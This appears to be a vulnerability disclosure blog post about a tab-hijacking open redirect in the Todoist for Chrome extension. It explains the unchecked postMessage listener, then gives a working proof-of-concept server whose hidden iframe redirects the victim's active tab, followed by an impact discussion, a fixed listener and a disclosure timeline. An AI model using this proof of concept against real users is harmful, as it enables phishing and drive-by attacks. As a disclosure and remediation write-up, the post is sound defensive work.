---
layout: post
title: "Tab Hijacking in Todoist for Chrome: One postMessage to Anywhere"
date: 2026-05-03
cve: "CVE Reserved"
severity: "High"
affected: "Todoist for Chrome <= 12.21.3"
tags: ["CWE-601", "open-redirect", "chrome-extension", "postMessage", "tab-hijack"]
---

<img width="1024" alt="Todoist for Chrome — Tab Hijack" src="/assets/images/TodoistBlog.png" />

[Todoist for Chrome](https://chromewebstore.google.com/detail/todoist-for-chrome/jldhpllghnbhlbpcmnajkpdmadaolakh) is the official browser extension from [Doist](https://doist.com/) for the Todoist task manager, with over 3 million users on the Chrome Web Store. The extension exposes its popup as a web-accessible resource and listens for `postMessage` events from the embedded Todoist web app — but it does so without validating the message origin or the URL it is told to navigate to.

## Vulnerability Details

**CWE-601: URL Redirection to Untrusted Site (Open Redirect)**

The popup script registers a `message` event listener that interprets any string starting with `SWITCH_URL:` as an instruction to navigate the user's currently active browser tab. The listener performs no origin check, no prefix check, and no URL validation. Combined with the popup being declared as a web-accessible resource for `<all_urls>`, any web page on the internet can silently hijack the active tab of any user with the extension installed.

The vulnerable handler in `popup.js`:

```javascript
window.addEventListener('message', (e) => {
    let str_data = e.data;
    if (str_data && str_data.indexOf('SWITCH_URL:') !== -1) {
        str_data = str_data.replace('SWITCH_URL:', '');
        browserApi.withActiveTab((tab) => {
            if (tab?.id) {
                browserApi.tabsUpdate(tab.id, { url: str_data });
            }
        });
    }
});
```

Three independent failures stack here:

1. **No `e.origin` check.** The listener was intended to receive messages from `https://app.todoist.com` (the iframe the popup embeds), but it accepts messages from any sender.
2. **Substring match instead of prefix match.** `indexOf('SWITCH_URL:') !== -1` matches anywhere in the payload, so even unrelated strings can trigger the branch.
3. **`popup.html` is web-accessible.** The manifest exposes the popup to `<all_urls>`, meaning any website can embed `chrome-extension://jldhpllghnbhlbpcmnajkpdmadaolakh/popup.html` in a hidden iframe and `postMessage` into it.

The combination turns `chrome.tabs.update` into a primitive that any page on the web can call against the victim's active tab.

## Proof of Concept

<video controls playsinline preload="metadata" style="width:100%;max-width:900px;display:block;margin:1em auto;border-radius:6px;">
  <source src="{{ '/assets/videos/Todoistv1.mp4' | relative_url }}" type="video/mp4">
  Your browser does not support the video tag.
</video>

A standalone HTML page is enough. When the victim — with the extension installed — visits the page, their currently focused tab is silently navigated to the attacker's URL.

```python
#!/usr/bin/env python3
"""
CVE PoC: Todoist Chrome Extension - Tab Hijacking
Victim visits this page -> their active tab is silently hijacked.
"""
import http.server
import socketserver

PORT = 8087
EXT_ID = "jldhpllghnbhlbpcmnajkpdmadaolakh"
PHISHING_URL = "https://example.com"

HTML = f"""<!DOCTYPE html>
<html><head><title>Innocent Page</title></head>
<body>
<h1>Nothing to see here...</h1>
<iframe src="chrome-extension://{EXT_ID}/popup.html"
        style="position:absolute;width:0;height:0;border:0;opacity:0"
        onload="this.contentWindow.postMessage('SWITCH_URL:{PHISHING_URL}','*')">
</iframe>
</body>
</html>"""

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"PoC running on http://localhost:{PORT}")
    httpd.serve_forever()
```

Flow:

1. Victim visits the attacker's page.
2. The page embeds `chrome-extension://<id>/popup.html` in a zero-size, transparent iframe.
3. On `load`, the page calls `contentWindow.postMessage('SWITCH_URL:https://evil.example/', '*')`.
4. The popup's listener fires, strips the `SWITCH_URL:` prefix, and calls `browserApi.tabsUpdate(activeTab.id, { url: 'https://evil.example/' })`.
5. The user's currently focused, unrelated tab silently navigates to the attacker-controlled URL.

There is no user interaction beyond visiting the malicious page. The popup never has to be opened by the user.

## Impact

This is a one-click open redirect that bypasses the most common defense — the same-origin policy — because the redirect is performed by a privileged extension API rather than by the page itself.

- **Phishing.** The attacker chooses what the victim's active tab is replaced with. A bank tab, an email tab, or a corporate SSO tab can be silently swapped for a credential-harvesting clone. The destination URL is whatever the attacker wants — there is no allowlist.
- **Drive-by exploit delivery.** The redirect can target browser-exploit landing pages, malicious downloads, or 1-click OAuth consent flows.
- **Cross-tab attack.** Because the navigation targets the *active tab*, not the attacker's tab, the user's existing session and context are weaponized. A user reading a news article can be kicked to an attacker page in a completely different tab from the one running the malicious iframe.
- **Trust laundering.** Users have been trained that "extensions you installed" are trusted. The redirect appears to originate from normal browsing, not from the malicious page, making the social-engineering surface significantly larger than a regular open redirect.

A second, related issue exists in the same listener: messages matching `^https?` are written to `localStorage.frame_src` and later loaded into the popup's iframe if the stored URL merely *contains* the substring `todoist.com/app`. Strings like `https://evil.example/?x=todoist.com/app` pass the check and persist across sessions, turning the popup chrome itself into a phishing surface. That issue is not exercised by the PoC above but shares the same root cause.

## Why It Was There

The `message` listener was written for legitimate communication between the popup and the embedded Todoist web app. The assumption — implicit but never enforced — was that the only sender would be `https://app.todoist.com`. That assumption holds inside the popup window when opened by clicking the toolbar icon, but it does not hold when the popup HTML is loaded as a third-party iframe on an attacker's page.

This is a recurring pattern in browser-extension security: **web-accessible popup pages inherit no origin protection from the toolbar context.** Any logic in the popup that trusts its own `window` is implicitly trusting every page on the web, unless `event.origin` checks are added explicitly.

The substring match (`indexOf('SWITCH_URL:') !== -1` instead of `startsWith`) is a smaller bug, but it is symptomatic of the same mindset — the listener is written as if the input were already trusted.

## Practical Guidance

**If you build a browser extension:**

- Always validate `event.origin` in `message` listeners. Treat the popup window as an attacker-reachable surface whenever the popup HTML is web-accessible.
- Audit your `web_accessible_resources` declarations. If a page does not need to be embeddable by arbitrary websites, do not list it — or scope it to specific origins via the `matches` field.
- Validate URLs passed to `chrome.tabs.update` and `chrome.tabs.create`. Parse with the `URL` constructor, check the protocol, and where possible enforce an allowlist of acceptable hosts.
- Use `startsWith` (or structured message envelopes) instead of `indexOf` for command dispatch.

**Drop-in fix for the listener:**

```javascript
window.addEventListener('message', (e) => {
    if (e.origin !== 'https://app.todoist.com') return;
    const str_data = e.data;
    if (typeof str_data !== 'string') return;

    if (str_data.startsWith('SWITCH_URL:')) {
        const target = str_data.slice('SWITCH_URL:'.length);
        try {
            const u = new URL(target);
            if (u.protocol !== 'https:' && u.protocol !== 'http:') return;
        } catch { return; }
        browserApi.withActiveTab((tab) => {
            if (tab?.id) browserApi.tabsUpdate(tab.id, { url: target });
        });
    }
});
```

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-04-15 | Vulnerability reported to Doist security team |
| 2026-04-22 | Doist confirms the issue |
| 2026-05-01 | CVE reserved |
| 2026-05-03 | Public disclosure |

## Advisory

- **CVE-ID:** Reserved (pending publication)
- **CWE:** CWE-601 — URL Redirection to Untrusted Site (Open Redirect)
- **Affected Product:** Todoist for Chrome <= 12.21.3
- **Vendor:** Doist
- **Solution:** Update to the latest version from the Chrome Web Store
- **Credit:** Moriel Harush

## References

- [Todoist for Chrome — Chrome Web Store](https://chromewebstore.google.com/detail/todoist-for-chrome/jldhpllghnbhlbpcmnajkpdmadaolakh)
- [Doist Security](https://doist.com/security)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [Chrome Extensions — web_accessible_resources](https://developer.chrome.com/docs/extensions/reference/manifest/web-accessible-resources)
